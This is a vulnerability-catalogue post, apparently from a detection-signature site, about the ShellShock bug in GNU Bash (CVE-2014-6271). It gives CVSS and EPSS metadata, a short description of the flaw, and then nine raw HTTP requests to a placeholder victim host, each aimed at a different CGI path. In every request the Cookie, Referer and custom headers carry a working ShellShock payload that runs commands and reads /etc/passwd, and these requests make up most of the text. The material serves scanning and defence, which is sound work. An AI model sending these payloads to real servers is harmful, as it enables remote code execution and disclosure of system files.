---
layout: post
cve_id: CVE-2014-6271
title: ShellShock - Remote Code Execution
pcap: true
pcap_path: /pcaps/2014/CVE-2014-6271.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2014/CVE-2014-6271.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pentest_swissky,0xelkomy
severity: critical
impact: 'Remote code execution can lead to unauthorized access, data theft, and system
  compromise.

  '
remediation: 'Apply the necessary patches and updates provided by the vendor to fix
  the vulnerability.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2014-6271
- https://nvd.nist.gov/vuln/detail/CVE-2014-7169
- http://www.kb.cert.org/vuls/id/252743
- http://www.us-cert.gov/ncas/alerts/TA14-268A
- http://advisories.mageia.org/MGASA-2014-0388.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2014-6271
  cwe-id: CWE-78
  epss-score: 0.9422
  epss-percentile: 0.99919
  cpe: cpe:2.3:a:gnu:bash:1.14.0:*:*:*:*:*:*:*
metadata:
  max-request: 8
  vendor: gnu
  product: bash
tags:
- cve2014
- cve
- rce
- shellshock
- kev
- gnu
- vkev
- vuln
---

## üîç Vulnerability Description
GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.

## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/status HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /debug.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/test-cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/stats HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /test.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/test.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/test HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/status/status.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_18) AppleWebKit/605.1.18 (KHTML, like Gecko) Version/18 Safari/605.1.18
Accept: */*
Accept-Language: en
Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd
Accept-Encoding: gzip
```

